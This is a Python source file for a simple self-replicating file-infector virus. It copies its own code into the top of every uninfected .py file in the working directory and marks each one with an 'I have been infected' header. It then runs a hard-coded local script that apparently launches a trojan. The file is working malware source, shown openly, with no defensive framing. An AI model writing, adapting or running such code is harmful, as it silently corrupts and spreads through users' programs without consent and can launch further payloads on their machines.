#I have been infected
# -*- coding:utf-8 -*-
import os
import __main__
import random
import os

def infect(filename):
    os.rename(filename, filename + "~")

    destination = open(filename, "w")
    source = open(filename + "~", "r")
    this = open(__main__.__file__, "r")

    for line in this:
        destination.write(line)
        if line.startswith("#the virus code is end"):
            break

    for line in source:
        destination.write(line)

    source.close()
    destination.close()
    this.close()


def is_infected(filename):
    f = open(filename, "r")
    return f.readline().startswith("#I have been infected")


def find_and_infect_files():
    path = "."
    dirs = os.listdir(path)
    for filename in dirs:
        if filename.endswith(".py") and not is_infected(filename):
            infect(filename)

def start_monitor():
    os.system("python /home/hadoopnew/PycharmProjects/virus/my_horse/main.py")

find_and_infect_files()
start_monitor()
# print "----------this is silly python virus----------"
#the virus code is end
